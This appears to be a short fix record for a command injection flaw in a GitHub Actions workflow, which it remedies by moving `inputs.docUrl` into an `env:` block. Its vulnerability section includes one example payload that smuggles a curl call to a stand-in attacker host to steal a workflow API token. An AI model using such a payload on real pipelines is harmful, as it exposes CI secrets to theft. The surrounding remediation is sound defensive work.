# Quick Implementation: [Security] Fix 1 HIGH severity issue

**Feature Branch**: `AIB-592-security-fix-1`
**Created**: 2026-04-10
**Mode**: Quick Implementation (bypassing formal specification)

## Description

Fix HIGH severity command injection vulnerability in `.github/workflows/retro-spec.yml` where `${{ inputs.docUrl }}` was directly interpolated in a GitHub Actions `run:` block, allowing shell metacharacter injection.

## Vulnerability

- **File**: `.github/workflows/retro-spec.yml:160`
- **Severity**: HIGH
- **Type**: Command injection via GitHub Actions expression interpolation
- **Exploit**: A crafted `docUrl` containing shell metacharacters (e.g., `$(curl attacker.com/?t=$WORKFLOW_API_TOKEN)`) could exfiltrate secrets from the runner environment.

## Fix

Passed `inputs.docUrl` through an `env:` block instead of direct `${{ }}` interpolation. Environment variables are set out-of-band and not interpolated into the shell script source, preventing expression injection.

**Before**: `${{ inputs.docUrl }}` directly in `run:` block
**After**: `env: { DOC_URL: '${{ inputs.docUrl }}' }` with `${DOC_URL}` in the script
